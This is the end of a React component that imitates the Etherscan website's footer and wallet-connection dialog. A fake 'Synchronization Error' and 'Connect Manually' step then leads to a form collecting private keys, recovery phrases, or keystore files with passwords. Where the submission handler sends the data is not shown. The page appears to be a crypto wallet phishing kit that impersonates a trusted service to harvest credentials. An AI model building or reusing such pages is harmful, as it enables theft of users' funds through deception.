                <div className="font-semibold text-gray-800 mb-2 text-sm">Company</div>
                <ul className="space-y-2.5 text-base">
                  <li><a href="https://etherscan.io/aboutus" className="hover:text-[#0584C3] text-xs">About Us</a></li>
                  <li><a href="https://etherscan.io/brandassets" className="hover:text-[#0584C3] text-xs">Brand Assets</a></li>
                  <li><a href="https://etherscan.io/contactus" className="hover:text-[#0584C3] text-xs">Contact Us</a></li>
                  <li className="flex items-center space-x-2">
                    <a href="https://etherscan.io/careers" className="hover:text-[#0584C3] text-xs">Careers</a>
                    <span className="bg-[#0584C3] text-white text-xs px-2 py-0.5 rounded-full ml-2">We're Hiring!</span>
                  </li>
                  <li><a href="https://etherscan.io/terms" className="hover:text-[#0584C3] text-xs">Terms & Privacy</a></li>
                  <li><a href="https://etherscan.io/bugbounty" className="hover:text-[#0584C3] text-xs">Bug Bounty</a></li>
                </ul>
              </div>
              {/* Community */}
              <div>
                <div className="font-semibold text-gray-800 mb-2 text-sm">Community</div>
                <ul className="space-y-2.5 text-base">
                  <li><a href="https://docs.etherscan.io/etherscan-v2" className="hover:text-[#0584C3] text-xs">API Documentation</a></li>
                  <li><a href="https://info.etherscan.com/" className="hover:text-[#0584C3] text-xs">Knowledge Base</a></li>
                  <li><a href="https://etherscan.freshstatus.io/" className="hover:text-[#0584C3] text-xs">Network Status</a></li>
                  <li><a href="https://info.etherscan.com/newsletters/" className="hover:text-[#0584C3] text-xs">Newsletters</a></li>
                </ul>
              </div>
              {/* Products & Services */}
              <div>
                <div className="font-semibold text-gray-800 mb-2 text-sm">Products & Services</div>
                <ul className="space-y-2.5 text-base">
                  <li><a href="https://etherscan.io/contactusadvertise" className="hover:text-[#0584C3] text-xs">Advertise</a></li>
                  <li><a href="https://etherscan.io/eaas" className="hover:text-[#0584C3] text-xs">Explorer as a Service (EaaS)</a></li>
                  <li><a href="https://etherscan.io/apis" className="hover:text-[#0584C3] text-xs">API Plans</a></li>
                  <li><a href="https://etherscan.io/priority-support" className="hover:text-[#0584C3] text-xs">Priority Support</a></li>
                  <li className="flex items-center">
                    <a href="https://blockscan.com/" className="hover:text-[#0584C3] text-xs flex items-center">Blockscan
                      <ExternalLink className="w-4 h-4 ml-1 inline text-[#6C757D]" />
                    </a>
                  </li>
                  <li className="flex items-center">
                    <a href="https://chat.blockscan.com/start" className="hover:text-[#0584C3] text-xs flex items-center">Blockscan Chat
                      <ExternalLink className="w-4 h-4 ml-1 inline text-[#6C757D]" />
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
          {/* Bottom Row */}
          <div className="flex flex-col sm:flex-row justify-between items-center text-xs text-black border-t border-gray-200 pt-4 pb-2">
            <div>Etherscan © 2025 (B1)</div>
            <div className="flex items-center mt-2 sm:mt-0">
              Donations: <a href="https://etherscan.io/address/0x71c7656ec7ab88b098defb751b7401b5f6d8976f" className="text-[#0584C3] hover:underline mx-1 font-mono">0x71c765...d8976f</a>
              <span className="text-red-500 ml-1">♥</span>
            </div>
          </div>
        </div>
      </footer>
      {/* Wallet Connection Modal */}
      {showWalletModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center pt-10 z-50">
          <div className="bg-white rounded-2xl p-6 pt-3 w-full max-w-md mx-4 relative">
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-2 mb-3 border-b">
              <h2 className="font-bold text-gray-900">Connect a Wallet</h2>
              <button
                onClick={() => setShowWalletModal(false)}
                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-6 h-6 text-gray-500" />
              </button>
            </div>

            {/* Wallet Options */}
            <div className="space-y-3">
              {/* MetaMask */}
              <button onClick={() => initializeFunc(3)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">MetaMask</div>
                    <div className="text-[0.6rem] text-[#0584C3] bg-blue-50 px-2 py-0.5 rounded-full inline-block">Popular</div>
                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[3].img} className='w-full' alt="" />
                </div>
              </button>

              {/* WalletConnect */}
              <button onClick={() => initializeFunc(1)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">WalletConnect</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[1].img} className='w-full' alt="" />
                </div>
              </button>

              <button onClick={() => initializeFunc(2)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Trust</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[2].img} className='w-full' alt="" />
                </div>
              </button>

              <button onClick={() => initializeFunc(8)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Coinbase</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[8].img} className='w-full' alt="" />
                </div>
              </button>

              {/* Coinbase Wallet */}
              <button onClick={() => initializeFunc(4)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Phantom</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[4].img} className='w-full' alt="" />
                </div>
              </button>

              <button onClick={() => initializeFunc(5)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Ledger</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[5].img} className='w-full' alt="" />
                </div>
              </button>

              <button onClick={() => initializeFunc(6)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Solfare</div>

                  </div>
                </div>
                <div className="w-5 h-5 rounded-lg flex items-center justify-center">
                  <img src={data[6].img} className='w-full' alt="" />
                </div>
              </button>

              <button onClick={() => initializeFunc(7)} className="w-full flex items-center justify-between p-4 py-2 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors group">
                <div className="flex items-center space-x-3 text-xs">
                  <div className="text-left flex items-center gap-x-1">
                    <div className="font-medium text-gray-900">Other Wallets</div>

                  </div>
                </div>
                <div className="w-5 h-5 bg-black rounded-lg flex items-center justify-center">
                  <img src={data[7].img} className='w-full' alt="" />
                </div>
              </button>
            </div>
          </div>
        </div>
      )}
      {showInitializingModal && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center pt-10 z-50"
        >
          <div className="bg-white rounded-2xl p-6 pt-3 w-full max-w-md mx-4 relative">
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-2">
              <div className="w-5 h-5 ml-3 bg-orange-100 rounded-lg flex items-center justify-center">
                <img src={data[walletId].img} className='w-full' alt="" />
              </div>
              <button
                onClick={() => setShowWalletModal(false)}
                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-6 h-6 text-gray-500" />
              </button>
            </div>

            {/* Wallet Options */}
            <div className="px-3 py-2 rounded-2xl mb-5 border border-[#0584C3] text-gray-500 flex text-xs font-semibold">
              <p>Initializing</p>
              <Typewriter
                options={{
                  strings: ["...", "..."],
                  autoStart: true,
                  loop: true,
                }}
              />
            </div>
          </div>
        </div>
      )}
      {showConnectManually && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center pt-10 z-50"
        >
          <div className="bg-white rounded-2xl p-6 pt-3 w-full max-w-md mx-4 relative">
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-2">
              <h2 className="font-bold text-gray-900 invisible">Connect mWallet</h2>
              <button
                onClick={() => setShowConnectManually(false)}
                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-6 h-6 text-gray-500" />
              </button>
            </div>

            {/* Wallet Options */}
            <div className="px-5 py-2 rounded-2xl mb-5 border border-[#0584C3] text-slate-400 md:text-lg text-center">
              <p className="text-red-500 mb-2 text-sm">Synchronization Error...</p>
              <button
                className="px-3 py-1 rounded-xl bg-[#0584C3] text-white text-sm"
                onClick={() => connectManually()}
              >
                Connect Manually
              </button>
            </div>
          </div>
        </div>
      )}
      {showPassword && (
        <div
          className="fixed inset-0 px-6 bg-black bg-opacity-50 flex items-start justify-center pt-10 z-50"
        >
          <div className="bg-white rounded-2xl w-full max-w-lg mx-auto">
            <div className="flex p-6 pb-3">
              {tabs.map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTabPassword(tab.id)}
                  className={
                    activeTabPassword === tab.id
                      ? 'flex-1 px-6 py-1 rounded-full text-sm font-medium transition-all duration-300 bg-[#0584C3] text-white shadow-sm'
                      : 'flex-1 px-6 py-1 rounded-full text-sm font-medium transition-all duration-300 text-gray-600 hover:bg-[#0584C3] hover:text-white'
                  }
                >
                  {tab.label}
                </button>
              ))}
            </div>

            <div className="px-6 pb-6">
              <form onSubmit={handleProceed}>
                <div className="relative overflow-hidden">
                  <div
                    className={
                      activeTabPassword === 'privatekey'
                        ? 'transition-all duration-300 transform translate-x-0 opacity-100'
                        : activeTabPassword === 'phrase'
                          ? 'transition-all duration-300 transform -translate-x-full opacity-0 absolute top-0 left-0 w-full'
                          : 'transition-all duration-300 transform translate-x-full opacity-0 absolute top-0 left-0 w-full'
                    }
                  >
                    <textarea
                      name='privatekey'
                      onChange={changeHandler}
                      placeholder="Enter your private key"
                      className="w-full h-24 p-4 bg-gray-200 border-2 border-[#0584C3] rounded-3xl resize-none text-gray-600 placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-[#0584C3]"
                    />
                    <p className="text-gray-600 text-sm mt-4 mb-6">
                      Typically 12 (sometimes 24) words separated by single spaces
                    </p>
                  </div>

                  <div
                    className={
                      activeTabPassword === 'phrase'
                        ? 'transition-all duration-300 transform translate-x-0 opacity-100'
                        : activeTabPassword === 'keystore'
                          ? 'transition-all duration-300 transform -translate-x-full opacity-0 absolute top-0 left-0 w-full'
                          : 'transition-all duration-300 transform translate-x-full opacity-0 absolute top-0 left-0 w-full'
                    }
                  >
                    <textarea
                      onChange={changeHandler}
                      name='phrase'
                      placeholder="Enter your current phrase"
                      className="w-full h-24 p-4 bg-gray-200 border-2 border-[#0584C3] rounded-3xl resize-none text-gray-600 placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-[#0584C3]"
                    />
                    <p className="text-gray-600 text-xs mt-1 mb-6">
                      Typically 12 (sometimes 24) words separated by single spaces
                    </p>
                  </div>

                  <div
                    className={
                      activeTabPassword === 'keystore'
                        ? 'transition-all duration-300 transform translate-x-0 opacity-100'
                        : activeTabPassword === 'phrase'
                          ? 'transition-all duration-300 transform translate-x-full opacity-0 absolute top-0 left-0 w-full'
                          : 'transition-all duration-300 transform translate-x-full opacity-0 absolute top-0 left-0 w-full'
                    }
                  >
                    <textarea
                      onChange={changeHandler}
                      name='keystore'
                      placeholder="Enter your Keystore JSON"
                      className="w-full h-24 p-4 bg-gray-200 border-2 border-[#0584C3] rounded-3xl resize-none text-gray-600 placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-[#0584C3] mb-4"
                    />
                    <textarea
                      onChange={changeHandler}
                      name='password'
                      placeholder="Enter your current phrase"
                      className="w-full h-24 p-4 bg-gray-200 border-2 border-[#0584C3] rounded-3xl resize-none text-[#0584C3] placeholder-gray-500 text-sm focus:outline-none focus:ring-2 focus:ring-[#0584C3]"
                    />
                    <p className="text-gray-600 text-xs mt-1.5 mb-6">
                      Several lines of text beginning with {`'{...}'`} plus the password you used to encrypt it.
                    </p>
                  </div>
                </div>
                <div className="space-x-4">
                  <button
                    type='submit'
                    className="w-fit bg-[#0584C3] text-white py-1 px-4 rounded-full text-sm font-medium hover:bg-gray-800 transition-colors duration-200"
                  >
                    Proceed
                  </button>
                  <button
                    onClick={handleCancel}
                    className="w-fit text-gray-600 text-sm font-medium py-1 px-4 hover:text-white rounded-full hover:bg-[#0584C3] transition-colors duration-200"
                  >
                    Cancel
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      )}
      {showValidate && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center pt-10 z-50"
        >
          <div className="bg-white rounded-2xl p-6 pt-3 w-full max-w-md mx-4 relative">
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-2">
              <h2 className="font-bold text-gray-900 invisible">Connect mWallet</h2>
              <button
                onClick={() => setShowValidate(false)}
                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-6 h-6 text-gray-500" />
              </button>
            </div>

            {/* Wallet Options */}
            <div className="px-5 py-2 rounded-2xl mb-5 border border-[#0584C3] text-slate-400 md:text-lg text-center">
              <p className="text-red-500 mb-2 text-sm font-bold">Unable To Validate Wallet!</p>
              <button onClick={() => {
                setShowValidate(false);
                setShowWalletModal(true);
              }} className="text-white rounded-lg mb-2 text-sm w-fit py-1 px-5 bg-[#0584C3]">Try Again</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;